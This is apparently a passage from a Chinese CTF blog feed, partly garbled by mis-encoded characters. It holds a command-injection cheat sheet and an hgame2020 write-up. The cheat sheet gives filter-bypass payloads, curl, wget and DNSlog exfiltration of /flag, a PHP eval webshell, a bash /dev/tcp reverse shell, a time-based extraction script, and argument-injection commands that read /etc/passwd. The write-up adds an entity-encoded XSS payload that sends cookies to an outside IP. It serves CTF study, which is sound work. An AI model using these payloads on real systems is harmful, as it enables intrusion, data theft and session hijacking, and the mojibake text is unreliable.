class=\"hljs-regexp\">//</span><span class=\"hljs-variable\">$1</span>æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class=\"hljs-regexp\">//</span>ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½<br>%<span class=\"hljs-number\">20</span><br>%<span class=\"hljs-number\">09</span><br>kg=$<span class=\"hljs-string\">&#x27;\\x20/flag&#x27;</span>&amp;&amp;cat<span class=\"hljs-variable\">$kg</span> <span class=\"hljs-regexp\">//</span>\\x20å˜æˆäº†ç©ºæ ¼<br>\\tå’Œ\\rå’Œ\\nä»£æ›¿ç©ºæ ¼<br></code></pre></td></tr></table></figure></li>\n<li><p>è¿‡æ»¤äº†éƒ¨åˆ†å…³é”®è¯</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">æ‹¼æ¥å®ç°ç»•è¿‡ï¼ša=l;b=s;<span class=\"hljs-keyword\">$a$b</span><br><span class=\"hljs-keyword\">å¼•å·ã€åæ–œæ ç»•è¿‡ï¼šca&#x27;&#x27;t    ca&quot;&quot;t  ca\\t</span><br><span class=\"hljs-keyword\">ç‰¹æ®Šå˜é‡ç»•è¿‡ï¼šca#@t  ca#*t</span><br><span class=\"hljs-keyword\">ç¼–ç ç»•è¿‡ï¼šecho Y2F0IC9mbGFn|base64 -d|bash</span><br><span class=\"hljs-keyword\">\t\techo &quot;636174202f666c6167&quot; | xxd -r -p|bashï¼ˆhexç¼–ç ï¼‰</span><br><span class=\"hljs-keyword\">\t\t$</span>(printf &quot;<span class=\"hljs-symbol\">\\x</span>63<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>74<span class=\"hljs-symbol\">\\x</span>20<span class=\"hljs-symbol\">\\x</span>2f<span class=\"hljs-symbol\">\\x</span>66<span class=\"hljs-symbol\">\\x</span>6c<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>67&quot;)<br>\t\t&#123;printf,&quot;<span class=\"hljs-symbol\">\\x</span>63<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>74<span class=\"hljs-symbol\">\\x</span>20<span class=\"hljs-symbol\">\\x</span>2f<span class=\"hljs-symbol\">\\x</span>66<span class=\"hljs-symbol\">\\x</span>6c<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>67&quot;&#125;|bash<br>\t\tå½“bashä¹Ÿè¢«ç¦æ—¶ï¼Œå¯ä»¥è¯•è¯•sh<br>é€šé…ç¬¦ç»•è¿‡ï¼šfl*   fla?   fla[0-z]  fla[123hg]  fla&#123;1,2,3,g&#125; <br>\t\tä¸€äº›å¸¸ç”¨çš„é€šé…ç¬¦ï¼š<br>\t\t\t* åŒ¹é…ä»»æ„ä¸ªæ•°çš„å­—ç¬¦<br>\t\t\t? åŒ¹é…ä¸€ä¸ªå­—ç¬¦<br>\t\t\t[list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…(list)ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ<br>\t\t\t[^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ<br>\t\t\t[!list] å’Œ[^list]ä¸€æ ·<br>\t\t\t&#123;1,2,&#125; é€ä¸€åŒ¹é…<br></code></pre></td></tr></table></figure></li>\n<li><p>è¿‡æ»¤<code>/</code></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs powershell\"><span class=\"hljs-built_in\">cat</span> `expr substr <span class=\"hljs-variable\">$</span>(<span class=\"hljs-built_in\">pwd</span>) <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>`flag<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"æ— å›æ˜¾\"><a href=\"#æ— å›æ˜¾\" class=\"headerlink\" title=\"æ— å›æ˜¾\"></a>æ— å›æ˜¾</h1><p>æ–‡ç« ï¼šâ€™<a href=\"https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/\">https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/</a>â€˜</p>\n<h3 id=\"æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘\"><a href=\"#æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘\" class=\"headerlink\" title=\"æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘\"></a>æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘</h3><ol>\n<li><p>curl ï¼š</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">curl http:<span class=\"hljs-regexp\">//</span>**.**.**.**<span class=\"hljs-regexp\">/index.php?jingzhe=`cat /</span>flag`<br>curl -d `cat <span class=\"hljs-regexp\">/flag|base64` http:/</span><span class=\"hljs-regexp\">/example.com</span><br></code></pre></td></tr></table></figure></li>\n<li><p>wget:</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">wget http:<span class=\"hljs-regexp\">//</span>**.**.**.**<span class=\"hljs-regexp\">/index.php?jingzhe=`cat /</span>flag`<br></code></pre></td></tr></table></figure></li>\n<li><p>DNSlog:</p>\n<figure class=\"highlight autohotkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autohotkey\">ping `cat /flag`.aaaaaa.ceye.io<br></code></pre></td></tr></table></figure></li>\n<li><p>å†™shellï¼š</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"xml\">echo &#x27;</span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&quot;flag&quot;</span>]); <span class=\"hljs-meta\">?&gt;</span></span><span class=\"xml\">&#x27; &gt; aaa.php</span><br></code></pre></td></tr></table></figure></li>\n<li><p>åå¼¹shell</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\"><span class=\"hljs-variable\">$ </span>bash -c <span class=\"hljs-string\">&quot;sh &gt;&amp; /dev/tcp/0.0.0.0/80 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘\"><a href=\"#æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘\" class=\"headerlink\" title=\"æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘\"></a>æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘</h3><p>çˆ†ç ´ï¼ŒEXPï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># -*-coding:utf-8 -*-import requestsimport reflag_format = re.compile(&#x27;flag\\\\&#123;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;\\\\&#125;&#x27;)all_letter = &#x27;-&#125;0123456789abcdefghijklmnopqrstuvwxyz&#x27;def get_flag(command):    try:        r = requests.get(&#x27;http://web.train.lilac.com:10008/&#x27;, params=&#123;&#x27;command&#x27;: command&#125;, timeout=1.5)    except:        return True    return Falseif __name__ == &#x27;__main__&#x27;:    flag = &#x27;flag&#123;&#x27;    while flag_format.match(flag) == None:        staus = 0        for i in all_letter:            payload = &#x27;| cat /flag | grep %s &amp;&amp; sleep 1.8&#x27; % (flag + i)            print(payload)            if get_flag(payload):                staus = 1                flag += i                print(flag)                break        if staus == 0:            flag = flag[0:-1]</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"å‚æ•°æ³¨å…¥\"><a href=\"#å‚æ•°æ³¨å…¥\" class=\"headerlink\" title=\"å‚æ•°æ³¨å…¥\"></a>å‚æ•°æ³¨å…¥</h1><p><a href=\"https://www.anquanke.com/post/id/107336\">https://www.anquanke.com/post/id/107336</a></p>\n<ol>\n<li><p>tar</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">tar --<span class=\"hljs-keyword\">use</span>-<span class=\"hljs-keyword\">compress</span>-<span class=\"hljs-keyword\">program</span>=&#x27;<span class=\"hljs-keyword\">cat</span> /etc/passwd&#x27; -<span class=\"hljs-keyword\">cf</span> 2.tar *<span class=\"hljs-keyword\">cat</span> 2.tar<br></code></pre></td></tr></table></figure></li>\n<li><p>find</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sqf\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> å‘½ä»¤ \\; -quitfind . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> cat /etc/passwd \\; -quitfind . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> <span class=\"hljs-built_in\">echo</span> hello \\; -quit<br></code></pre></td></tr></table></figure></li>\n<li><p>git</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">git <span class=\"hljs-keyword\">grep</span> -i --<span class=\"hljs-built_in\">line</span>-<span class=\"hljs-keyword\">number</span> -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">&#x27;--open-files-in-pager=å‘½ä»¤;&#x27;</span> master<br></code></pre></td></tr></table></figure></li>\n<li><p>wget</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">$url = &#x27;--<span class=\"hljs-built_in\">directory</span>-<span class=\"hljs-built_in\">prefix</span>=/<span class=\"hljs-built_in\">var</span>/www/html http://<span class=\"hljs-built_in\">example</span>.com/<span class=\"hljs-built_in\">example</span>.php&#x27;;<span class=\"hljs-built_in\">system</span>(escapeshellcmd(&#x27;wget &#x27;.$url));<br></code></pre></td></tr></table></figure></li>\n<li><p>sendmail</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">sendmail -t -i -f <span class=\"hljs-keyword\">from</span>@sth.com -C<span class=\"hljs-regexp\">/etc/</span>passwd -X<span class=\"hljs-regexp\">/tmp/</span>output.txt &lt; mail.txt<br></code></pre></td></tr></table></figure></li>\n<li><p>curl</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">curl -F password=@<span class=\"hljs-regexp\">/etc/</span>passwd http:<span class=\"hljs-regexp\">//</span>example.com<br></code></pre></td></tr></table></figure></li>\n<li><p>mysql</p>\n<figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs erlang-repl\">mysql -uuser -ppassword -e  \\! å‘½ä»¤<br></code></pre></td></tr></table></figure></li>\n<li><p>untar</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">$zip_name = <span class=\"hljs-string\">&#x27;-d /var/www/html archive.zip&#x27;</span>;<span class=\"hljs-keyword\">system</span>(<span class=\"hljs-string\">&#x27;unzip -j &#x27;</span>.escapeshellarg($zip_name).<span class=\"hljs-string\">&#x27; *.tmp -d /tmp&#x27;</span>);<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"è½¯è¿æ¥\"><a href=\"#è½¯è¿æ¥\" class=\"headerlink\" title=\"è½¯è¿æ¥\"></a>è½¯è¿æ¥</h1><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ln</span> -s /etc/passwd <span class=\"hljs-number\">222222</span>.jpgtar cvfp <span class=\"hljs-number\">1</span>.tar <span class=\"hljs-number\">222222</span>.jpg<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"é•¿åº¦é™åˆ¶æ³¨å…¥\"><a href=\"#é•¿åº¦é™åˆ¶æ³¨å…¥\" class=\"headerlink\" title=\"é•¿åº¦é™åˆ¶æ³¨å…¥\"></a>é•¿åº¦é™åˆ¶æ³¨å…¥</h1><p><a href=\"https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/\">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a></p>\n<p>ä¾‹ï¼š</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">&gt;ls<span class=\"hljs-symbol\">\\\\</span>ls&gt;_&gt;<span class=\"hljs-symbol\">\\ </span><span class=\"hljs-symbol\">\\\\</span>&gt;-t<span class=\"hljs-symbol\">\\\\</span>&gt;<span class=\"hljs-symbol\">\\&gt;</span>gls&gt;&gt;_<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"grepå¤§æ³•\"><a href=\"#grepå¤§æ³•\" class=\"headerlink\" title=\"grepå¤§æ³•\"></a>grepå¤§æ³•</h1><p><code>grep -ri . flag</code></p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2020/02/05/hgame2020/",
            "url": "http://blog.m1n.me/2020/02/05/hgame2020/",
            "title": "hgame2020",
            "date_published": "2020-02-05T15:09:06.000Z",
            "content_html": "<p><a href=\"https://hgame.vidar.club/#/challenge/list\">https://hgame.vidar.club/#/challenge/list</a></p>\n<span id=\"more\"></span>\n\n<h1 id=\"week1\"><a href=\"#week1\" class=\"headerlink\" title=\"week1\"></a>week1</h1><h2 id=\"Cosmosçš„åšå®¢\"><a href=\"#Cosmosçš„åšå®¢\" class=\"headerlink\" title=\"Cosmosçš„åšå®¢\"></a>Cosmosçš„åšå®¢</h2><p>åˆšå¼€å§‹æ‹¿åˆ°é¢˜ç›®æç¤ºè¯´gitæºç æ³„éœ²ï¼Œå°±ç”¨githackæŠŠæºç æ‰«äº†ä¸‹æ¥ï¼Œä½†æ˜¯çœ‹äº†åŠå¤©æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œåæ¥çœ‹äº†WPæ‰çŸ¥é“ç›´æ¥å»gitä¸Šæ‰¾å†å²æäº¤è®°å½•ï¼Œemmmmm</p>\n<h2 id=\"æ¥å¤´éœ¸ç‹\"><a href=\"#æ¥å¤´éœ¸ç‹\" class=\"headerlink\" title=\"æ¥å¤´éœ¸ç‹\"></a>æ¥å¤´éœ¸ç‹</h2><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹</p>\n<ol>\n<li>referer</li>\n<li>X-Forwarded-For</li>\n<li>UA</li>\n<li>è¯·æ±‚æ–¹å¼</li>\n<li>æœ€åä¸€ä¸ªä¹Ÿæ˜¯ä¹‹å‰æ²¡è§è¿‡çš„æ—¶é—´ï¼ŒIf-Unmodified-Sinceï¼Œæ ¼å¼If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT</li>\n</ol>\n<h2 id=\"Code-World\"><a href=\"#Code-World\" class=\"headerlink\" title=\"Code World\"></a>Code World</h2><p>è®¿é—®å‘ç°403ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°æç¤º302è·³è½¬ï¼Œå°±ç›´æ¥è®¿é—®index.phpå¹¶ä¸”æŠ“åŒ…æ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼ï¼Œç„¶åæç¤ºä»¤a=10ï¼Œé¢˜ç›®åˆæç¤ºa=b+cï¼Œå°±ç”¨payload?a=1+9,ä½†æ˜¯è¿˜è¦urlç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶+ä¼šå˜æˆç©ºæ ¼</p>\n<h2 id=\"é¸¡å°¼æ³°ç«\"><a href=\"#é¸¡å°¼æ³°ç«\" class=\"headerlink\" title=\"é¸¡å°¼æ³°ç«\"></a>é¸¡å°¼æ³°ç«</h2><p>æç¤ºåˆ†æ•°è¦60000ä»¥ä¸Šï¼ŒæŠ“åŒ…æ”¹ä¸€ä¸‹å°±å¥½äº†</p>\n<h1 id=\"week2\"><a href=\"#week2\" class=\"headerlink\" title=\"week2\"></a>week2</h1><h2 id=\"Cosmosåšå®¢çš„åå°\"><a href=\"#Cosmosåšå®¢çš„åå°\" class=\"headerlink\" title=\"Cosmosåšå®¢çš„åå°\"></a>Cosmosåšå®¢çš„åå°</h2><p>è®¿é—®çœ‹åˆ°ç™»é™†ç•Œé¢ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œå¼„åŠå¤©ä¸è¡Œï¼Œå¿˜è®°äº†æç¤ºåªç”¨äº†HTMLå’ŒPHPï¼Œç„¶åç›´æ¥è®¿é—®å‘ç°æœ‰?action=login.phpï¼Œåº”è¯¥å¯ä»¥ç”¨phpä¸ºåè®®è¯»æºç ï¼Œå› æ­¤æ‹¿åˆ°äº†login.phpå’Œadmin.phpçš„æºç <br>åœ¨login.phpä¸­å‘ç°debugå¯ä»¥è¯»å–ä»»æ„å˜é‡ï¼Œè¯»å–ä¸€ä¸‹usernameå’Œpasswordç„¶å$admin_passwordåˆæ˜¯å›ºå®šçš„ï¼Œè¯»å–å‘ç°æ˜¯oeå¼€å¤´çš„ï¼ˆä¿å­˜ä¸€ä¸ª0eå¼€å¤´çš„MD5å€¼å’ŒåŸå€¼ä»¥ä¾¿ä¸æ—¶ä¹‹éœ€s878926199a/<br>0e545993274517709034328855841020ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥çªç ´ç™»é™†ï¼Œå°±æ¥åˆ°äº†admin.phpé¡µé¢ï¼Œè¯»æºç å‘ç°ç”¨CSRFå’Œfileä¼ªåè®®æ‹¿åˆ°flagï¼Œpayloadï¼šfile://localhost/flag</p>\n<h2 id=\"Cosmosçš„ç•™è¨€æ¿-1\"><a href=\"#Cosmosçš„ç•™è¨€æ¿-1\" class=\"headerlink\" title=\"Cosmosçš„ç•™è¨€æ¿-1\"></a>Cosmosçš„ç•™è¨€æ¿-1</h2><p>ç”¨å•å¼•å·é—­åˆå›æ˜¾ä¸ä¸€æ ·ï¼Œå­˜åœ¨sql<br>æ³¨å…¥ç‚¹ï¼Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼è¿˜æœ‰selectï¼Œç©ºæ ¼å¯ä»¥ç”¨/**/ç»•è¿‡ï¼Œselectå¯ä»¥åŒå†™ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œçš„#è¦urlç¼–ç æˆ%23ï¼Œä¸ç„¶è¿‡ä¸å» ï¼Œä¸€ç›´å¡åœ¨è¿™é‡Œï¼Œç„¶åå°±æ˜¯ç†Ÿæ‚‰çš„æ‹¿flagç¯èŠ‚</p>\n<h2 id=\"Cosmosçš„æ–°è¯­è¨€\"><a href=\"#Cosmosçš„æ–°è¯­è¨€\" class=\"headerlink\" title=\"Cosmosçš„æ–°è¯­è¨€\"></a>Cosmosçš„æ–°è¯­è¨€</h2><p>è®¿é—®mycodeæ‹¿åˆ°æºç ï¼Œå°±æ˜¯ä¸€å±‚åˆä¸€å±‚çš„åŠ å¯†ï¼Œï¼ŒæŒ‰ç…§åŠ å¯†æ­¥éª¤è§£å¯†å°±å¥½äº†ã€‚ç”±äºtokenä¼šå®æ—¶åˆ·æ–°ï¼Œè¿™é‡Œç”¨pyè„šæœ¬è·‘ä¸€ä¸‹å°±å¥½äº†</p>\n<h2 id=\"Cosmosçš„èŠå¤©å®¤\"><a href=\"#Cosmosçš„èŠå¤©å®¤\" class=\"headerlink\" title=\"Cosmosçš„èŠå¤©å®¤\"></a>Cosmosçš„èŠå¤©å®¤</h2><p>æç¤ºå¿…é¡»ç®¡ç†å‘˜çš„tokenæ‰èƒ½æ‹¿flagï¼Œç»“åˆé¢˜ç›®çœ‹åº”è¯¥æ˜¯è€ƒå¯ŸXSSæ‹¿cookieã€‚ç„¶åå¼€å§‹æµ‹è¯•è¿‡æ»¤ï¼Œå‘ç°è¿‡æ»¤äº†&lt;ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡HTMLå®ä½“ç¼–ç ç»•è¿‡ï¼Œæ„é€ payloadï¼Œï¼ˆè¿™é‡Œæ”¾ä¸€ä¸ªæ‹¿cookieå¹¶ä¸”ç™»é™†çš„æ€»ç»“æ–‡ç« <a href=\"https://blog.csdn.net/lhh134/article/details/86477305%E4%BB%A5%E4%BE%BF%E6%97%A5%E5%90%8E%E5%BF%98%E8%AE%B0%EF%BC%89\">https://blog.csdn.net/lhh134/article/details/86477305ä»¥ä¾¿æ—¥åå¿˜è®°ï¼‰</a><br>ç„¶åç”¨payloadï¼š<code>&lt;svg/onload=&quot;&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x39;&amp;#x36;&amp;#x2e;&amp;#x32;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x32;&amp;#x31;&amp;#x36;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot;</code>æ‹¿åˆ°äº†token<br>/?token=f802788a02a51f9c624bb5d91815bï¼Œè®¿é—®flagé¡µé¢ï¼Œæ”¹ä¸€ä¸‹tokenå°±æ‹¿åˆ°äº†flag</p>\n<h1 id=\"week3\"><a href=\"#week3\" class=\"headerlink\" title=\"week3\"></a>week3</h1><h2 id=\"åºåˆ—ä¹‹äº‰-Ordinal-Scale\"><a href=\"#åºåˆ—ä¹‹äº‰-Ordinal-Scale\" class=\"headerlink\" title=\"åºåˆ—ä¹‹äº‰ - Ordinal Scale\"></a>åºåˆ—ä¹‹äº‰ - Ordinal Scale</h2><p>å…ˆæŸ¥çœ‹æºä»£ç å‘ç°source.zipï¼Œæ‹¿åˆ°æºç ï¼Œåˆæ­¥çœ‹ä¸€ä¸‹åº”è¯¥æ˜¯PHPååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå…ˆçœ‹ä¸€ä¸‹game.phpå‘ç°</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$game</span>-&gt;rank-&gt;Get() === <span class=\"hljs-number\">1</span>)&#123;<span class=\"hljs-meta\">?&gt;</span></span><span class=\"xml\"></span><br><span class=\"xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span>&gt;</span>hgame&#123;flag_is_here&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span></span><br><span class=\"xml\">    </span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> &#125;<span class=\"hljs-meta\">?&gt;</span></span><br></code></pre></td></tr></table></figure>\n<p>äºæ˜¯æ‰¾ä¸€ä¸‹gameç±»ï¼Œå…¶ä¸­rankåœ¨__constructæ–¹æ³•ä¸­ï¼Œæ–°å»ºçš„Rankç±»ï¼Œè€ŒRankç±»ä¸­çš„rankç”±__constructæ–¹æ³•åˆ›å»ºï¼Œæ¥è‡ªsessionæˆ–è€…ç›´æ¥éšæœºï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è®©rank=1ï¼Œä½†æ˜¯å‘ç°æœ‰__destructæ–¹æ³•æ¥åˆ¤æ–­Rankç±»æ˜¯ä¸æ˜¯æœåŠ¡å™¨å®šä¹‰çš„ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥åˆ©ç”¨constructå‡½æ•°å®šä¹‰$this-&gt;key = &amp;$this-&gt;severKeyæ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾ååºåˆ—åŒ–çš„ç‚¹ï¼Œå‘ç°åœ¨Monsterç±»ä¸­å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œä½†æ˜¯æ˜¯é€šè¿‡cookieçš„æ–¹å¼ä¼ å…¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ ç¬¦åˆçš„cookieæ¥å°†payloadä¼ å…¥ï¼Œè¿™é‡Œå°±éœ€è¦çŸ¥é“encryptKeyæ˜¯å¤šå°‘ï¼Œè€ŒencryptKeyæ˜¯ç”±å‚æ•°ä¼ å…¥çš„ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$data</span> = [<span class=\"hljs-variable\">$playerName</span>, <span class=\"hljs-keyword\">$this</span>-&gt;encryptKey];<br><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">init</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$data</span></span>)</span>&#123;<br>        <span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-variable\">$data</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;welcomeMsg = sprintf(<span class=\"hljs-keyword\">$this</span>-&gt;welcomeMsg, <span class=\"hljs-variable\">$value</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;sign .= md5(<span class=\"hljs-keyword\">$this</span>-&gt;sign . <span class=\"hljs-variable\">$value</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>\n<p>å…¶ä¸­foreachç”¨æ³•ï¼š<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png\" alt=\"1\"><br>ä»¥åŠsprintfç”¨æ³•ï¼š<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png\" alt=\"2\"><br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†playernameèµ‹å€¼ä¸º%så°±å¯ä»¥å¾ªç¯çš„å°†ç¬¬äºŒä¸ªå€¼è¾“å‡ºï¼Œæ‹¿åˆ°encryptKeyã€‚<br>expï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 